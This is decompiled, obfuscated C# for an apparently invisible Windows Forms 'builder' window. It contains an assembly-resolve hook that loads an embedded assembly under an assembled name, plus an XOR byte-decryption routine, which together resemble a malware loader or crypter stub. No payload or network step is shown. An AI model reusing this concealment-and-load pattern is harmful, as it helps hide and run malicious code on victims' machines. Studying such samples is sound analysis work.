using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using ns0;

namespace ns1;

public class mainBuilderForm : Form
{
	private IContainer icontainer_0;

	private StatusStrip statusStrip_0;

	private ToolStripDropDownButton toolStripDropDownButton1;

	private ToolStripProgressBar toolStripProgressBar1;

	internal ToolStripStatusLabel toolStripStatusLabel1;

	public static string smethod_0()
	{
		return "or";
	}

	public mainBuilderForm()
	{
		InitializeComponent();
	}

	public mainBuilderForm(IContainer icontainer_1, StatusStrip statusStrip_1, ToolStripStatusLabel toolStripStatusLabel_0, ToolStripDropDownButton toolStripDropDownButton_0, ToolStripProgressBar toolStripProgressBar_0)
	{
		icontainer_0 = icontainer_1;
		statusStrip_0 = statusStrip_1;
		ToolStripStatusLabel val = (toolStripStatusLabel1 = toolStripStatusLabel_0);
		toolStripDropDownButton1 = toolStripDropDownButton_0;
		toolStripProgressBar1 = toolStripProgressBar_0;
	}

	internal static bool smethod_1(object object_0, ResolveEventArgs resolveEventArgs_0, out Assembly assembly_0)
	{
		AppDomain appDomain = (AppDomain)object_0;
		if (resolveEventArgs_0.Name.Contains("F" + smethod_0() + Class5.smethod_0()))
		{
			assembly_0 = appDomain.Load(Class1.smethod_0());
			return true;
		}
		assembly_0 = null;
		return false;
	}

	protected override void vmethod_0(bool bool_0)
	{
		if (bool_0 && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(bool_0);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		//IL_01df: Unknown result type (might be due to invalid IL or missing references)
		statusStrip_0 = new StatusStrip();
		ToolStripStatusLabel val = (toolStripStatusLabel1 = new ToolStripStatusLabel());
		toolStripDropDownButton1 = new ToolStripDropDownButton();
		toolStripProgressBar1 = new ToolStripProgressBar();
		((Control)statusStrip_0).SuspendLayout();
		((Control)this).SuspendLayout();
		((ToolStrip)statusStrip_0).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)toolStripStatusLabel1,
			(ToolStripItem)toolStripDropDownButton1,
			(ToolStripItem)toolStripProgressBar1
		});
		((Control)statusStrip_0).set_Location(new Point(0, 1));
		((Control)statusStrip_0).set_Name("Ⴐ");
		((Control)statusStrip_0).set_Size(new Size(120, 22));
		((Control)statusStrip_0).set_TabIndex(0);
		((Control)statusStrip_0).set_Text(" ");
		((ToolStripItem)toolStripStatusLabel1).set_Name("toolStripStatusLabel1");
		((ToolStripItem)toolStripStatusLabel1).set_Size(new Size(10, 17));
		((ToolStripItem)toolStripStatusLabel1).set_Text(" ");
		((ToolStripItem)toolStripDropDownButton1).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)toolStripDropDownButton1).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)toolStripDropDownButton1).set_Name("toolStripDropDownButton1");
		((ToolStripItem)toolStripDropDownButton1).set_Size(new Size(13, 20));
		((ToolStripItem)toolStripDropDownButton1).set_Text(" ");
		((ToolStripItem)toolStripProgressBar1).set_Name("toolStripProgressBar1");
		((ToolStripItem)toolStripProgressBar1).set_Size(new Size(100, 16));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 20f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_AutoSize(true);
		((Form)this).set_ClientSize(new Size(120, 23));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)statusStrip_0);
		((Control)this).set_DoubleBuffered(true);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Margin(new Padding(4, 5, 4, 5));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("mainBuilderForm");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Control)this).set_Text(" ");
		((Control)statusStrip_0).ResumeLayout(false);
		((Control)statusStrip_0).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public static void smethod_2(byte[] byte_0, byte[] byte_1)
	{
		for (int i = 0; i < byte_0.Length; i++)
		{
			byte_0[i] = (byte)(byte_0[i] ^ byte_1[i % byte_1.Length]);
		}
	}
}
